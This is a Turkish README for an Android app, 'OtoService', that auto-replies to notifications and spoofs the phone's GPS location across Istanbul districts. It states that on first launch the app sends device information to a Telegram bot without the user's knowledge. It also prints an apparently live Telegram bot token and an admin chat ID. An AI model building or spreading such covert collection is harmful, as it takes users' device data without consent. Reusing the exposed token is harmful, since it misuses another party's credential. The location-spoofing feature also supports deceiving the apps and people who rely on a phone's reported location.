# OtoService - Android Automation App

## Genel Bakış

OtoService, Android cihazlar için geliştirilmiş güçlü bir otomasyon ve güvenlik uygulamasıdır. Uygulama üç ana özellik sunar:

1. **Otomatik Yanıt Sistemi**: Seçili uygulamalardan gelen bildirimlere otomatik yanıt verir
2. **İstanbul Konum Sistemi**: İstanbul ilçeleri arasında sahte konum döngüsü oluşturur
3. **Güçlü Lisans Sistemi**: Anti-tamper, anti-clone ve zaman manipülasyonu koruması

## Özellikler

### 🔐 Lisans Sistemi
- Offline lisans doğrulama
- Cihaz parmak izi tabanlı benzersiz lisans kodları
- Zaman manipülasyonu tespiti
- Klon uygulama tespiti
- Kod değişikliği tespiti
- Otomatik Telegram entegrasyonu (cihaz bilgisi gönderimi)

### 📱 Otomatik Yanıt
- Maksimum 6 uygulama seçimi
- Özelleştirilebilir yanıt mesajı
- Ayarlanabilir gecikme süresi (5-300 saniye)
- Yeni gönderenlere öncelik verme sistemi
- NotificationListenerService kullanımı

### 📍 Sahte Konum (Mock Location)
- Sadece İstanbul ilçeleri
- Sıralı ilçe rotasyonu
- İlçe başına özelleştirilebilir süre
- İlçe içinde rastgele hareket
- Foreground service ile sürekli çalışma

### 🔒 Güvenlik Özellikleri
- Multi-layered anti-tamper kontrolleri
- Klon uygulama tespiti
- Zaman manipülasyonu koruması
- Kalıcı kilit mekanizmaları
- Hassas veri otomatik silme

## Teknik Detaylar

### Gereksinimler
- **Minimum SDK**: 24 (Android 7.0)
- **Target SDK**: 34 (Android 14)
- **Kotlin**: 1.9.20
- **Gradle**: 8.2

### İzinler
- `INTERNET`: Telegram bot iletişimi için
- `FOREGROUND_SERVICE`: Konum servisi için
- `ACCESS_FINE_LOCATION`: Konum erişimi
- `ACCESS_MOCK_LOCATION`: Sahte konum için
- `POST_NOTIFICATIONS`: Bildirimler için
- `BIND_NOTIFICATION_LISTENER_SERVICE`: Otomatik yanıt için

### Mimari
```
com.example.otoservice/
├── core/                    # Paylaşılan yardımcılar
│   ├── Constants.kt
│   └── PreferencesManager.kt
├── license/                 # Lisans yönetimi
│   └── LicenseManager.kt
├── security/                # Güvenlik kontrolleri
│   ├── AntiTamperChecker.kt
│   └── AntiCloneChecker.kt
├── autoreply/              # Otomatik yanıt
│   └── AutoReplyNotificationListener.kt
├── location/               # Konum sahteleme
│   ├── IstanbulDistricts.kt
│   └── LocationSpoofService.kt
├── permissions/            # İzin yönetimi
│   └── PermissionsChecker.kt
└── deviceinfo/             # Cihaz bilgisi toplama
    ├── DeviceInfoCollector.kt
    └── TelegramSender.kt
```

## Kurulum

### 1. Proje Kurulumu
```bash
# Projeyi Android Studio'da açın
# File > Open > OtoService klasörünü seçin
```

### 2. Telegram Bot Yapılandırması
`Constants.kt` dosyasında bot bilgileri zaten yapılandırılmıştır:
- Bot Token: `7996610464:AAHMIs2CwF0--eB4_8S4X1-C5b5kZRYNQMs`
- Admin Chat ID: `6466581970`

### 3. Build ve Çalıştırma
```bash
# Debug build
./gradlew assembleDebug

# Release build (ProGuard ile)
./gradlew assembleRelease
```

## Kullanım

### İlk Çalıştırma
1. Uygulamayı yükleyin ve açın
2. Uygulama otomatik olarak cihaz bilgilerini Telegram'a gönderir (kullanıcı görmez)
3. Admin Telegram'dan cihaz bilgilerini alır
4. Admin lisans kodu üretir ve kullanıcıya verir
5. Kullanıcı lisans kodunu "Lisans" sekmesine girer

### Lisans Kodu Formatı
- Format: `XXXX-XXXX-XXXX-XXXX`
- Toplam 16 karakter (4 grup, her grup 4 karakter)
- Büyük harf ve rakamlar

### İzinlerin Ayarlanması
"İzinler" sekmesinden tüm gerekli izinleri verin:
1. **Bildirim Erişim İzni**: Otomatik yanıt için
2. **Konum İzni**: Sahte konum için
3. **Bildirim Gösterme İzni**: Servis bildirimleri için
4. **Sahte Konum Uygulaması**: Geliştirici Seçenekleri'nden ayarlayın

### Otomatik Yanıt Kullanımı
1. "Uygulamalar" sekmesine gidin
2. "Uygulama Ekle" ile maksimum 6 uygulama seçin
3. Yanıt mesajını özelleştirin
4. Gecikme süresini ayarlayın
5. Sistem otomatik olarak çalışmaya başlar

### Konum Sahteleme Kullanımı
1. "Konum" sekmesine gidin
2. "İlçe Seç ve Sırala" ile ilçeleri seçin
3. Her ilçe için süre belirleyin
4. Güncelleme aralığını ayarlayın
5. "Sahte Konumu Aç" switch'ini açın

## Güvenlik Notları

### Lisans Algoritması
- Özel bir hash tabanlı algoritma kullanır
- SECRET_SEED + Cihaz Parmak İzi + Son Kullanma Tarihi
- SHA-256 hash ile çift iterasyon
- Determinstik sonuç (aynı girdi = aynı lisans)

### Anti-Tamper Mekanizması
- Çoklu sınıf varlık kontrolü
- Runtime imza doğrulama
- Paket yapısı kontrolü
- Kritik string hash'leri

### Anti-Clone Mekanizması
- Paket adı kontrolü
- Data dizini path analizi
- Process ismi kontrolü
- Kullanıcı profili kontrolü
- Clone keyword tespiti

### Zaman Manipülasyonu Koruması
- System.currentTimeMillis() takibi
- SystemClock.elapsedRealtime() takibi
- Geri gitme tespiti (1 dakika threshold)
- İleriye atlama tespiti (7 gün threshold)

## Sorun Giderme

### Lisans Doğrulama Hataları
- **"Lisans kodu geçersiz"**: Kod yanlış veya cihaz eşleşmiyor
- **"Bu lisansın süresi dolmuştur"**: Lisans süresi bitmiş, yeni lisans gerekli
- **"Tarih/saat oynama tespit edildi"**: Cihaz saati değiştirilmiş, yeni lisans gerekli

### Otomatik Yanıt Çalışmıyor
- Bildirim Erişim İzni verildiğinden emin olun
- Seçili uygulamaların bildirim gönderdiğini kontrol edin
- Lisansın geçerli olduğunu doğrulayın

### Sahte Konum Çalışmıyor
- Geliştirici Seçenekleri > Sahte Konum Uygulaması ayarını kontrol edin
- Konum izinlerinin verildiğinden emin olun
- En az bir ilçe seçildiğini doğrulayın

## Geliştirici Notları

### Kod Yapısı
- **Dil**: Kotlin
- **UI**: ViewBinding
- **Async**: Kotlin Coroutines
- **HTTP**: OkHttp3
- **Persistence**: SharedPreferences

### Test Etme
- Manuel test gerektirir (emülatörde çalışmayabilir)
- Gerçek cihazda test edin
- Mock location için geliştirici seçenekleri gerekli

### Özelleştirme
- `Constants.kt`: Tüm sabitler
- `IstanbulDistricts.kt`: İlçe listesi ve koordinatlar
- Layout dosyaları: UI özelleştirme

## Lisans

Bu proje özel kullanım içindir. Tüm hakları saklıdır.

## Destek

Sorularınız için:
- Telegram: Bot üzerinden iletişim
- Email: Yapılandırılmış email adresi

---

**Not**: Bu uygulama Android platform kurallarına uygundur. Root erişimi gerektirmez ve tüm izinler kullanıcı tarafından manuel olarak verilir.
